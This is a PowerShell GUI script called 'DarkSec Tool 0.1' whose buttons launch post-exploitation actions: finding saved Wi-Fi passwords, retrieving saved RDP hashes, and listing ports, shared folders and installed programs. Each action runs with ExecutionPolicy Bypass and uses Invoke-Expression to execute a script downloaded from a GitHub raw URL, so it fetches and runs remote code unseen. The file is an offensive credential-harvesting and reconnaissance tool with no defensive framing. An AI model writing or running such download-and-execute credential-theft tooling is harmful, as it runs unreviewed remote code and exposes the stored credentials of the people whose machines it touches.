Add-Type -AssemblyName System.Windows.Forms

# Create a form
$form = New-Object System.Windows.Forms.Form
$form.Text = "DarkSec Tool 0.1"
$form.Size = New-Object System.Drawing.Size(800, 600)
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
$form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen
$form.BackColor = [System.Drawing.Color]::Black

# Create a label for the result
$resultLabel = New-Object System.Windows.Forms.Label
$resultLabel.Text = "Result:"
$resultLabel.Location = New-Object System.Drawing.Point(20, 20)
$resultLabel.AutoSize = $true
$resultLabel.ForeColor = [System.Drawing.Color]::White
$form.Controls.Add($resultLabel)

# Create a text box for the result (larger size)
$resultTextBox = New-Object System.Windows.Forms.TextBox
$resultTextBox.Location = New-Object System.Drawing.Point(20, 50)
$resultTextBox.Size = New-Object System.Drawing.Size(750, 400)
$resultTextBox.Multiline = $true
$resultTextBox.ScrollBars = [System.Windows.Forms.ScrollBars]::Vertical
$resultTextBox.BackColor = [System.Drawing.Color]::Black
$resultTextBox.ForeColor = [System.Drawing.Color]::FromArgb(0, 255, 0)  # Fluorescent green text
$form.Controls.Add($resultTextBox)

# Create buttons for each menu option with white text
$button1 = New-Object System.Windows.Forms.Button
$button1.Text = "Find saved WLAN passwords"
$button1.Location = New-Object System.Drawing.Point(20, 470)
$button1.Size = New-Object System.Drawing.Size(250, 30)
$button1.ForeColor = [System.Drawing.Color]::White
$button1.Add_Click({
    $result = Run-Script1
    $resultTextBox.Lines = $result
})
$form.Controls.Add($button1)

$button2 = New-Object System.Windows.Forms.Button
$button2.Text = "Retrieve RDP saved hash"
$button2.Location = New-Object System.Drawing.Point(300, 470)
$button2.Size = New-Object System.Drawing.Size(250, 30)
$button2.ForeColor = [System.Drawing.Color]::White
$button2.Add_Click({
    $result = Run-Script2
    $resultTextBox.Lines = $result
})
$form.Controls.Add($button2)

# Create buttons for options 3, 4, and 5
$button3 = New-Object System.Windows.Forms.Button
$button3.Text = "List open ports on localhost"
$button3.Location = New-Object System.Drawing.Point(580, 470)
$button3.Size = New-Object System.Drawing.Size(250, 30)
$button3.ForeColor = [System.Drawing.Color]::White
$button3.Add_Click({
    $result = Run-Script3
    $resultTextBox.Lines = $result
})
$form.Controls.Add($button3)

$button4 = New-Object System.Windows.Forms.Button
$button4.Text = "List shared folders on localhost"
$button4.Location = New-Object System.Drawing.Point(20, 510)
$button4.Size = New-Object System.Drawing.Size(250, 30)
$button4.ForeColor = [System.Drawing.Color]::White
$button4.Add_Click({
    $result = Run-Script4
    $resultTextBox.Lines = $result
})
$form.Controls.Add($button4)

$button5 = New-Object System.Windows.Forms.Button
$button5.Text = "List programs installed on localhost"
$button5.Location = New-Object System.Drawing.Point(300, 510)
$button5.Size = New-Object System.Drawing.Size(250, 30)
$button5.ForeColor = [System.Drawing.Color]::White
$button5.Add_Click({
    $result = Run-Script5
    $resultTextBox.Lines = $result
})
$form.Controls.Add($button5)

# Create an exit button with white text
$buttonExit = New-Object System.Windows.Forms.Button
$buttonExit.Text = "Exit"
$buttonExit.Location = New-Object System.Drawing.Point(580, 510)
$buttonExit.Size = New-Object System.Drawing.Size(180, 30)
$buttonExit.ForeColor = [System.Drawing.Color]::White
$buttonExit.Add_Click({
    Run-Script0
})
$form.Controls.Add($buttonExit)

# Helper function to run scripts and return the result as an array of lines
function Run-Script1 {
    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/WLAN-PSW-Finder.ps1').Content)"
    return $result -split "`n"  # Split the result into an array of lines
}

function Run-Script2 {
    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/RetrieveRDPSavedHash.ps1').Content)"
    return $result -split "`n"  # Split the result into an array of lines
}

function Run-Script0 {
    $resultTextBox.Text = "Exiting the script..."
    Start-Sleep -Seconds 2
    $form.Close()
}

# Define individual script functions for options 3, 4, and 5
function Run-Script3 {
    # Start the "Port-Discovery.ps1" script
    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/Port-Discovery.ps1').Content)"
    return $result -split "`n"  # Split the result into an array of lines
}

function Run-Script4 {
    # Start the "SharedFolder.ps1" script
    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/SharedFolder.ps1').Content)"
    return $result -split "`n"  # Split the result into an array of lines
}

function Run-Script5 {
    # Start the "ProgramLister.ps1" script
    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/ProgramLister.ps1').Content)"
    return $result -split "`n"  # Split the result into an array of lines
}

# Show the form
$form.ShowDialog()
